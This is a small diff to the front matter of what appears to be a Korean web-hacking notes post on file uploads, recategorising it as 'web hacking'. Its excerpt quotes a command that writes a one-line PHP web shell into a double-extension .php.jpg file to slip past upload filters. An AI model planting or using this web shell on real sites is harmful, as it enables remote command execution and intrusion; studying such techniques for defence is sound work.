@@ -2,7 +2,7 @@
 slug: "file-transfer"
 title: "file_transfer"
 date: 2026-07-14
-category: "미분류"
+category: "웹 해킹"
 tags: []
 excerpt: "php 일시에 다음과 같이 넣음 ~~~bash echo '<?php system($_GET[\"cmd\"]); ?>' >> {파일명}.php.jpg ~~~ --- ### 특수문자…"
 readingTime: 1
